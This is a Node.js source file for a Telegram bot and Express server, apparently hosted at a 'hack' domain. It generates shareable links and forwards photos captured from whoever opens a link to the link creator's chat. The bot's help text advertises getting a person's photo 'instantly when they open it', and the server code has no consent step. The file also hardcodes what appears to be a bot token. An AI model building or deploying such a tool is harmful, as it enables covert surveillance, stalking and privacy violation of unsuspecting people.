const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

// Configuration - CHANGE THESE!
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8276842153:AAF9BCMLa_b-Zpo-YdKl1HDbsIS4kqVKRuk';
const WEBAPP_URL = process.env.WEBAPP_URL || 'https://hack-edso.onrender.com';
const PORT = process.env.PORT || 3000;

// Initialize
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const app = express();

// Store active links
const activeLinks = new Map();

// Configure multer
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
});

app.use(express.json());
app.use(express.static('public'));

// Bot commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 
    '👋 Welcome to Photo Capture Bot!\n\n' +
    'Generate a unique link to capture photos when someone opens it.\n\n' +
    'Click the button below to get started.',
    {
      reply_markup: {
        inline_keyboard: [[
          { text: '🔗 Generate Link', callback_data: 'generate_link' }
        ]]
      }
    }
  );
});

bot.onText(/\/generate/, (msg) => {
  const chatId = msg.chat.id;
  generateLinkForUser(chatId);
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId,
    '📖 *How to use:*\n\n' +
    '1️⃣ Click "Generate Link" button\n' +
    '2️⃣ Share the link with anyone\n' +
    '3️⃣ Get their photo instantly when they open it\n\n' +
    '*Commands:*\n' +
    '/start - Start the bot\n' +
    '/generate - Generate new link\n' +
    '/help - Show this help',
    { parse_mode: 'Markdown' }
  );
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  
  if (query.data === 'generate_link') {
    generateLinkForUser(chatId);
    bot.answerCallbackQuery(query.id, { text: 'Link generated!' });
  }
});

function generateLinkForUser(chatId) {
  const linkId = uuidv4();
  const captureUrl = `${WEBAPP_URL}/c/${linkId}`;
  
  activeLinks.set(linkId, {
    chatId: chatId,
    createdAt: Date.now(),
    captures: 0
  });
  
  bot.sendMessage(chatId, 
    `✅ *Link Generated Successfully!*\n\n` +
    `🔗 Share this link:\n\`${captureUrl}\`\n\n` +
    `⏰ Link expires in 24 hours\n` +
    `📸 You'll receive photos when someone opens it.\n\n` +
    `_Tap the link to copy it_`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔗 Generate Another', callback_data: 'generate_link' }]
        ]
      }
    }
  );
}

// Serve capture page
app.get('/c/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  if (!activeLinks.has(linkId)) {
    return res.status(404).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Link Expired</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
          body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          }
          .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
          }
          h1 { color: #e74c3c; margin-bottom: 10px; }
          p { color: #666; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>⚠️ Link Expired</h1>
          <p>This link is no longer valid or has expired.</p>
        </div>
      </body>
      </html>
    `);
  }
  
  res.sendFile(path.join(__dirname, 'views', 'capture.html'));
});

// API endpoint to get linkId for the capture page
app.get('/api/link/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  if (!activeLinks.has(linkId)) {
    return res.status(404).json({ error: 'Invalid link' });
  }
  
  res.json({ linkId: linkId, valid: true });
});

// Handle photo upload
app.post('/upload', upload.single('photo'), async (req, res) => {
  const { linkId } = req.body;
  
  if (!activeLinks.has(linkId)) {
    return res.status(404).json({ error: 'Invalid link' });
  }
  
  const linkData = activeLinks.get(linkId);
  const photo = req.file.buffer;
  
  try {
    await bot.sendPhoto(linkData.chatId, photo, {
      caption: `📸 *New Capture!*\n\n` +
               `🔗 Link ID: \`${linkId.substring(0, 8)}...\`\n` +
               `⏰ Time: ${new Date().toLocaleString()}\n` +
               `📊 Total captures: ${linkData.captures + 1}`,
      parse_mode: 'Markdown'
    });
    
    linkData.captures++;
    res.json({ success: true });
    
  } catch (error) {
    console.error('Error sending photo:', error);
    res.status(500).json({ error: 'Failed to send photo' });
  }
});

// Clean expired links every hour
setInterval(() => {
  const now = Date.now();
  const expireTime = 24 * 60 * 60 * 1000; // 24 hours
  
  for (const [linkId, data] of activeLinks.entries()) {
    if (now - data.createdAt > expireTime) {
      activeLinks.delete(linkId);
      console.log(`Deleted expired link: ${linkId}`);
    }
  }
}, 60 * 60 * 1000);

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    activeLinks: activeLinks.size,
    uptime: process.uptime()
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`🤖 Bot is active and ready!`);
  console.log(`🌐 Webhook URL: ${WEBAPP_URL}`);
});
